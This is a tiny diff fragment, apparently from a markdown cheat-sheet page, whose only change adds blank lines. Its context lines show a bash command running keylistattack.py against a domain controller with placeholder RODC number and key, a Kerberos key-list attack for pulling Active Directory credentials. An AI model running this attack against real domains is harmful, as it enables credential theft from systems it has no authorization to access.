@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:36:10.988131+00:00'
 ```bash
 keylistattack.py -kdc server.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST
 ```
+
+
